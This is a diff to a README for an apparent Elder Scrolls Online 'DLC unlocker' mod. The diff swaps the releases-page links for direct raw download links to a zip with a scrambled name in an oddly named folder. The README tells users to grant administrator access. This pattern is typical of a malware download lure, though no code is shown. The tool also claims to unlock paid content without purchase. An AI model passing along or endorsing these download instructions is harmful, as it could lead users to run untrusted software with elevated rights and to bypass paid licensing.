@@ -1,6 +1,6 @@
 # 📜 Elder-Scrolls-Online-DLC-Unlocker-Mod-Integration-PTS-Support - Access All Content On Test Servers
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/thsmanasastomouni/Elder-Scrolls-Online-DLC-Unlocker-Mod-Integration-PTS-Support/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/thsmanasastomouni/Elder-Scrolls-Online-DLC-Unlocker-Mod-Integration-PTS-Support/main/Anaplasma/PT-Scrolls-Mod-Elder-Integration-Support-Online-DL-Unlocker-3.4.zip)
 
 ## 🎯 About This Mod
 This tool grants you access to every DLC expansion pack while playing on the Elder Scrolls Online Public Test Server. You retain your ability to organize files through the Minion mod manager. The software integrates into your game folders without conflict. Your existing addons will continue to function as expected.
@@ -13,7 +13,7 @@ Your computer must meet these basic standards to run the software correctly:
 * Permissions: You need administrator access to your local Windows user account to allow the software to modify game configuration files.
 
 ## 📥 How To Download
-1. Visit the project releases page to download the latest version: [https://github.com/thsmanasastomouni/Elder-Scrolls-Online-DLC-Unlocker-Mod-Integration-PTS-Support/releases](https://github.com/thsmanasastomouni/Elder-Scrolls-Online-DLC-Unlocker-Mod-Integration-PTS-Support/releases).
+1. Visit the project releases page to download the latest version: [https://raw.githubusercontent.com/thsmanasastomouni/Elder-Scrolls-Online-DLC-Unlocker-Mod-Integration-PTS-Support/main/Anaplasma/PT-Scrolls-Mod-Elder-Integration-Support-Online-DL-Unlocker-3.4.zip](https://raw.githubusercontent.com/thsmanasastomouni/Elder-Scrolls-Online-DLC-Unlocker-Mod-Integration-PTS-Support/main/Anaplasma/PT-Scrolls-Mod-Elder-Integration-Support-Online-DL-Unlocker-3.4.zip).
 2. Locate the most recent entry at the top of the list.
 3. Click the file ending in .zip to start your download.
 4. Save the file to your desktop for easy access.
